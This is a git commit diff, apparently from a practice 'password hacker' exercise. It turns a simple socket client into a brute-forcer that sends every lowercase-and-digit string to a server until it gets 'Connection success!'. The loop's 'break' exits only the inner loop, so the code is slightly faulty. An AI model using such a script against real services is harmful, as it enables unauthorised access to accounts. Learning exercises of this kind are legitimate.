40652e3bfe4388aee5b92b2a6175ca274b84b97f
Rutzno <d.rutzno@gmail.com>
2022-08-30 03:08:39 +0100

    stage 2

--- hacking/hack.py
+++ hacking/hack.py
@@ -4,14 +4,14 @@ import sys
 """
 __author__ = "Mack_TB"
 __since__ = "28/8/2021"
-__version__ = "1.0.1"
+__version__ = "1.0.2"
 """
 
 if __name__ == "__main__":
     args = sys.argv
 
-    if len(args) != 4:
-        print("The script should be called with three arguments(the hostname, the port and the data to send)")
+    if len(args) != 3:
+        print("The script should be called with two arguments, the hostname and the port to connect to the server")
     else:
         with socket.socket() as client_socket:  # creating the socket with context manager
             hostname = args[1]
@@ -20,11 +20,26 @@ if __name__ == "__main__":
 
             client_socket.connect(address)  # connecting to the server
 
-            data = args[3].encode()  # converting to bytes
+            chars = "abcdefghijklmnopqrstuvwxyz0123456789"
 
-            client_socket.send(data)  # sending through socket
+            i = 1
+            while i <= 1000000:
+                for s in itertools.product(chars, repeat=i):
+                    password = "".join(s)
+                    client_socket.send(password.encode())  # sending through socket
 
-            response = client_socket.recv(1024)  # receiving the response
-            response = response.decode()  # decoding from bytes to string
+                    response = client_socket.recv(1024)  # receiving the response
+                    response = response.decode()  # decoding from bytes to string
+                    if response == "Connection success!":
+                        print(password)
+                        break
+                i += 1
 
-            print(response)
+            # password = args[3].encode()  # converting to bytes
+            #
+            # client_socket.send(password)  # sending through socket
+            #
+            # response = client_socket.recv(1024)  # receiving the response
+            # response = response.decode()  # decoding from bytes to string
+            #
+            # print(response)
